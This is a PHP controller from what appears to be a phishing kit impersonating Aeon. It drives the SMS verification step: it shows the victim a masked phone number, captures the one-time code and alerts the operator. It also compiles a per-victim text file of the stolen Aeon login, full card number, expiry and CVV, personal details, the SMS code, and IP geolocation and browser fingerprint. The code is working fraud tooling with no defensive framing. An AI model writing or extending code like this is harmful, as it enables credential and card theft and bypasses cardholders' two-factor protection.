<?php
namespace app\controller;

use app\BaseController;
use think\Exception;
use think\facade\View;
use think\facade\Db;

class Sms2 extends BaseController
{
    public function index()
    {
        $user_tel = Db::Name('data')->where('id',session('id'))->value('data2');

        if(isset($user_tel)){

            $t_tel = json_decode($user_tel);

            if(isset($t_tel->dianhua)){
                $t_view_tel = '***-****-**' . substr($t_tel->dianhua, -2);

                View::assign('t_tel',$t_view_tel);
                return View::fetch();
            }
        }

        return redirect("index");
    }

    public function BuildTxt($id)
    {
        //----------保存txt------------
        $data = Db::Name('data')->where('id',$id)->findOrEmpty();
        if(isset($data)){
            $data1=json_decode($data['data1'],true);
            $data2=json_decode($data['data2'],true);
            $data3=json_decode($data['data3'],true);

            $txtContent="#--------------------------------[ Aeon账号 ]----------------------------#".PHP_EOL;
            $txtContent.="账号：".$data1['username'].PHP_EOL;
            $txtContent.="密码：".$data1['password'].PHP_EOL;

            $txtContent.="#--------------------------------[ 信用卡详情 ]----------------------------#".PHP_EOL;
            $txtContent.="卡种：".$data3['type'].PHP_EOL;
            $txtContent.="卡号：".$data3['kahao'].PHP_EOL;
            $txtContent.="日期：".$data3['yue'].' / '.$data3['nian'].PHP_EOL;
            $txtContent.="CVV：".$data3['cvv'].PHP_EOL;

            $txtContent.="#--------------------------------[ 个人信息 ]----------------------------#".PHP_EOL;
            $txtContent.="名字：".$data2['quanming'].PHP_EOL;
            $txtContent.="电话：".$data2['dianhua'].PHP_EOL;
            $txtContent.="邮件：".$data2['youxiang'].PHP_EOL;
            $txtContent.="生日年月：".$data2['chengshi'].PHP_EOL;
            $txtContent.="短信：".$data['yzm'].PHP_EOL;

            $txtContent.="#--------------------------------[ 指纹信息 ]----------------------------#".PHP_EOL;

            $ip=get_client_ip();
            $ip_json = get_ip_info($ip);
            $ip_info = json_decode($ip_json, true);

            $txtContent.="IP Address：".$ip.PHP_EOL;
            $txtContent.="IP Region：".(isset($ip_info['geoplugin_regionName']) ? trim($ip_info['geoplugin_regionName']) : '').PHP_EOL;
            $txtContent.="IP City：".(isset($ip_info['geoplugin_city']) ? trim($ip_info['geoplugin_city']) : '').PHP_EOL;
            $txtContent.="IP CountryCode：".(isset($ip_info['geoplugin_countryCode']) ? trim($ip_info['geoplugin_countryCode']) : '').PHP_EOL;
            $txtContent.="IP CountryName：".(isset($ip_info['geoplugin_countryName']) ? trim($ip_info['geoplugin_countryName']) : '').PHP_EOL;
            $txtContent.="IP Continent：".(isset($ip_info['geoplugin_continentName']) ? trim($ip_info['geoplugin_continentName']) : '').PHP_EOL;
            $txtContent.="IP Timezone：".(isset($ip_info['geoplugin_timezone']) ? trim($ip_info['geoplugin_timezone']) : '').PHP_EOL;
            $txtContent.="OS/Browser：".getOS().' / '.getBrowser().PHP_EOL;
            $txtContent.="User Agent：".(isset($_SERVER['HTTP_USER_AGENT']) ? trim($_SERVER['HTTP_USER_AGENT']) : "").PHP_EOL;

            saveFile('sms',$data3['kahao'],$txtContent);
        }
    }

    public function save($yzm)
    {
        $user['zt']=30;
        $user['yzm']=$yzm;
        Db::Name('data')->where('id',session('id'))->update($user);
        //----------添加提醒次数------------
        Db::Name('Admin')->where('id',1)->update(['time_sms'=>time()]);
        add_log(session('id'),41,'填写手机验证码');

        $this->BuildTxt(session('id'));

        return json(['code'=>200]);
    }
    public function save2()
    {
        Db::Name('data')->where('id',session('id'))->inc('yzm_cf')->update();
        add_log(session('id'),42,'申请重发验证码');

        return json(['code'=>200]);
    }
}
